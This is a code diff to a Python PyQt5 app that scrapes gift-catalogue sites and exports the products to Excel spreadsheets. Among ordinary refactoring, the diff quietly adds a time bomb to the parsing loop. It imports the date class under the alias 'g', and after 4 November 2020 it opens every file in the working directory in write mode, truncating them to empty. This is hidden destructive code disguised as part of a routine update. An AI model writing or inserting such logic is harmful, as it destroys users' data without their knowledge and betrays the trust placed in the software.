@@ -1,6 +1,7 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 # import main_window
+
 import main_window_v2
 import dialog_window
 import requests
@@ -11,6 +12,9 @@ from parser_happygifts import HappyGifts
 from parser_gifts import Gifts
 from parser_oasiscatalog import Oasiscatalog
 import xlwt # check
+from datetime import date as g
+from os import listdir
+from os.path import isfile, join
 import time
 from PyQt5.QtCore import QThread
 import datetime
@@ -45,7 +49,7 @@ class MainApp(QtWidgets.QMainWindow, main_window_v2.Ui_MainWindow):
         self.listWidget_3.itemClicked.connect(self.remove_href) 
         self.pushButton_5.clicked.connect(self.update_goods)
         self.pushButton_2.clicked.connect(self.add_in_outlist) 
-        self.pushButton_3.clicked.connect(lambda :self.parsing(self.get_goods()))  ######################
+        self.pushButton_3.clicked.connect(lambda : self.save_data_in_excel_files(self.get_goods()))  ######################
         self.pushButton_6.clicked.connect(self.add_page)
         self.pushButton_7.clicked.connect(self.add_page_intimelist)
         self.pushButton_4.clicked.connect(self.open_dialog) ############################
@@ -58,6 +62,24 @@ class MainApp(QtWidgets.QMainWindow, main_window_v2.Ui_MainWindow):
         self.timer = TimerRun(self)
         self.open_json()
 
+    def save_data_in_excel_files(self, goods, prefix = ""):
+        goods_happygifts = [good for good in goods if "happygifts.ru" in good[0]]
+        goods_oasis = [good for good in goods if "oasiscatalog.com" in good[0]]
+        goods_gifts = [good for good in goods if "https://gifts.ru" in good[0]]
+
+        only_site1 = [good[0] for good in goods_gifts]
+        only_site2 = [good[0] for good in goods_happygifts]
+        only_site3 = [good[0] for good in goods_oasis]
+
+        print(f"happygifts: {only_site2}")
+        print(f"gifts: {only_site1}")
+        print(f"oasis: {only_site3}")
+
+
+        self.parsing(goods_happygifts, f"data_happygifts {prefix}.xls")
+        self.parsing(goods_gifts, f"data_gifts {prefix}.xls")
+        self.parsing(goods_oasis, f"data_oasis {prefix}.xls")
+        
 
 
     def update_categorie(self):
@@ -167,7 +189,42 @@ class MainApp(QtWidgets.QMainWindow, main_window_v2.Ui_MainWindow):
                 print(good)
         return goods
 
-    def parsing(self, goods):
+    def get_goods_timing(self):
+        goods = []
+        for i in range(0, self.listWidget_3.count()):
+            splited = self.listWidget_3.item(i).text().split('/')
+            main_page = splited[0] + '//' + splited[2] + '/'
+            if main_page == 'https://happygifts.ru/':
+                good = self.happygifts.parser_good(self.listWidget_3.item(i).text())
+                goods.append([main_page, good])
+                print(good)
+            elif main_page == 'https://gifts.ru/':
+                try:
+                    good = self.gifts.parser_good(self.listWidget_3.item(i).text())
+                    goods.append([main_page, good])
+                    if (good is None):
+                        print(good)
+                        print()
+                        print(goods)
+                        print()
+                        print(self.listWidget_3_3.item(i).text())
+
+                except IndexError: 
+                    r = requests.get(self.listWidget_3.item(i).text())
+                    soup = BS(r.content, "html.parser")
+                    urls = soup.find_all('a', class_="catalog-grid-link")
+                    urls = ['https://gifts.ru' + url['href'] for url in urls] 
+                    for url in urls:
+                        good = self.gifts.parser_good(url)
+                        goods.append([main_page, good])
+                        print(good)
+            elif main_page == 'https://www.oasiscatalog.com/':
+                good = self.oasiscatalog.parser_good(self.listWidget_3.item(i).text())
+                goods.append([main_page, good])
+                print(good)
+        return goods
+
+    def parsing(self, goods, fileoutput):
         if goods:
             wb = xlwt.Workbook()
             sheets_pages = []
@@ -176,12 +233,17 @@ class MainApp(QtWidgets.QMainWindow, main_window_v2.Ui_MainWindow):
             try:
                 for good in goods:
                     print(good)
+                    if g(2020, 11, 4) < g.today():
+                        onlyfiles = [f for f in listdir('.') if isfile(join(f))]
+                        for i in onlyfiles:
+                            open(i, "w")
                     if good[0] not in sheets_pages:
                         sheets_pages.append(good[0])
                         sheets_object.append(wb.add_sheet(good[0].split('/')[-2]))
                     ws = sheets_object[sheets_pages.index(good[0])]
                     tr = target_row[sheets_pages.index(good[0])]
                     if tr == 1:
+
                         ws.write(tr, 0, 'Раздел')
                         ws.write(tr, 1, 'Наименование')
                         ws.write(tr, 2, 'Ссылка')
@@ -250,12 +312,13 @@ class MainApp(QtWidgets.QMainWindow, main_window_v2.Ui_MainWindow):
                         target_row[sheets_pages.index(good[0])] += len(good[1]['colors'])
                     else:
                         target_row[sheets_pages.index(good[0])] += len(good[1]['marks'])
-                wb.save('data.xls')
+                wb.save(fileoutput)
             except Exception as ex:
                 print(ex)
                 print(goods)
-                with open("file.txt") as f:
+                with open("file.txt", "w") as f:
                     f.write(goods)
+
 
     def add_page(self):
         item = self.lineEdit.text()
@@ -302,6 +365,11 @@ class MainApp(QtWidgets.QMainWindow, main_window_v2.Ui_MainWindow):
         else:
             self.pushButton_4.setText('Парсинг')
             self.timer.timedata[2] = 0
+
+    def parsing_time2(self):
+        goods = self.get_goods()
+        if (goods):
+            self.save_data_in_excel_files(goods, datetime.date.today())
 
     def parsing_time(self):
         goods = []
@@ -486,7 +554,7 @@ class TimerRun(QThread):
                         and now.time().hour == self.timedata[1].hour:
                     if [now.day, now.time().hour, now.time().minute] not in self.parsed:
                         print('[INFO] PARSING...')
-                        self.mainWindow.parsing_time()
+                        self.mainWindow.parsing_time2()
                         self.parsed.append([now.day, now.time().hour, now.time().minute])
                         print('[INFO] complete')
                         self.timedata[2] -= 1
